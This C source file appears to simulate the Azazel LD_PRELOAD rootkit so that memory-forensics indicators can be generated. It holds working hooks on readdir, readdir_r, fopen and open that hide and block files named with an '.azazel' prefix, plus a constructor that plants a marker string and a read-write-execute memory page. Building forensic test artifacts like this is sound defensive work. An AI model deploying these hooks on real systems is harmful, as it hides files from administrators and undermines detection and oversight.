/*
 * azazel_implant.c — Azazel LD_PRELOAD Rootkit Simulation
 *
 * Memory dump indicators:
 *  - Injected .so mapped in process memory (MAP_ANONYMOUS backed)
 *  - Hooked PLT/GOT entries pointing to our code
 *  - LD_PRELOAD string in process environment block (heap)
 *  - Writable-executable memory segments
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/mman.h>


/* ── Hide files/dirs with this prefix ── */
#define HIDE_PREFIX ".azazel"

/* Original function pointers */
static struct dirent *(*real_readdir)(DIR *dirp) = NULL;
static int (*real_readdir_r)(DIR *dirp, struct dirent *entry,
                              struct dirent **result) = NULL;
static int (*real_fileno)(FILE *stream) = NULL;

static void resolve_symbols(void) {
    if (!real_readdir) {
        real_readdir   = dlsym(RTLD_NEXT, "readdir");
        real_readdir_r = dlsym(RTLD_NEXT, "readdir_r");
    }
}

/* Hook readdir — hide .azazel* files */
struct dirent *readdir(DIR *dirp) {
    resolve_symbols();
    struct dirent *ret;
    /* Keep reading until we find a non-hidden entry */
    while ((ret = real_readdir(dirp)) != NULL) {
        if (strstr(ret->d_name, HIDE_PREFIX) != NULL)
            continue;
        break;
    }
    return ret;
}

/* Hook readdir_r */
int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    resolve_symbols();
    int r;
    do {
        r = real_readdir_r(dirp, entry, result);
    } while (r == 0 && *result != NULL &&
             strstr((*result)->d_name, HIDE_PREFIX) != NULL);
    return r;
}

/* Hook fopen — deny opening .azazel* files */
FILE *fopen(const char *pathname, const char *mode) {
    if (strstr(pathname, HIDE_PREFIX) != NULL) {
        errno = ENOENT;
        return NULL;
    }
    static FILE *(*real_fopen)(const char *, const char *) = NULL;
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    return real_fopen(pathname, mode);
}

/* Hook open — deny opening .azazel* files */
int open(const char *pathname, int flags, ...) {
    if (strstr(pathname, HIDE_PREFIX) != NULL) {
        errno = ENOENT;
        return -1;
    }
    static int (*real_open)(const char *, int, ...) = NULL;
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    va_list ap;
    va_start(ap, flags);
    mode_t mode = va_arg(ap, mode_t);
    va_end(ap);
    return real_open(pathname, flags, mode);
}

/* Constructor — marks presence in memory dumps */
__attribute__((constructor))
void azazel_init(void) {
    /* This string will appear in process memory, identifiable by scanners */
    const char *marker = "AZAZEL_ROOTKIT_ACTIVE_v1";
    /* Allocate memory that persists — visible in heap analysis */
    char *sig = malloc(64);
    if (sig) {
        memcpy(sig, marker, strlen(marker) + 1);
        /* Also leak an RWX page for forensic indicator */
        void *rwx = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (rwx != MAP_FAILED) {
            memcpy(rwx, "[Azazel LD_PRELOAD hook active]", 32);
        }
    }
}
